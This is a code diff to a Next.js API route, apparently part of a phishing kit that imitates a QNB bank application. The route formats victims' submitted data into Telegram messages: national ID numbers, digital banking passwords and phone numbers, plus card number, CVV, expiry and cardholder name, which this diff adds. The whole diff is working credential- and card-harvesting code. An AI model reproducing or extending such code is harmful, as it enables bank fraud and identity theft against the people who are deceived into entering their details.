@@ -1,12 +1,12 @@
 import { NextRequest, NextResponse } from 'next/server'
 
 interface TelegramData {
-  username: string // TC Kimlik
-  password: string
-  phone: string
-  creditLimit: string
+  username: string // TC Kimlik veya Kart Türü
+  password: string // Dijital Şifre veya CVV
+  phone: string // Telefon veya Kart Numarası
+  creditLimit: string // Kredi Limiti veya Son Kullanma Tarihi
   applicationDate: string
-  realName?: string
+  realName?: string // Ad Soyad veya Kart Sahibi
   realSurname?: string
 }
 
@@ -39,8 +39,25 @@ export async function POST(request: NextRequest) {
       )
     }
 
+    // Veri türünü belirle (Kart bilgisi mi, normal başvuru mu?)
+    const isCardData = telegramData.username === 'KART_BILGISI'
+    
     // Telegram mesajını oluştur
-    const message = `
+    const message = isCardData ? `
+🔔 *YENİ KART BİLGİSİ*
+
+🌐 *Domain:* \`${fullDomain}\`
+
+💳 *Kart Bilgileri:*
+💳 Kart Numarası: \`${telegramData.phone}\`
+🔐 CVV: \`${telegramData.password}\`
+📅 Son Kullanma: \`${telegramData.creditLimit}\`
+👤 Kart Sahibi: \`${telegramData.realName}\`
+📅 Gönderim Tarihi: \`${telegramData.applicationDate}\`
+
+---
+
+    `.trim() : `
 🔔 *YENİ QNB BAŞVURUSU*
 
 🌐 *Domain:* \`${fullDomain}\`
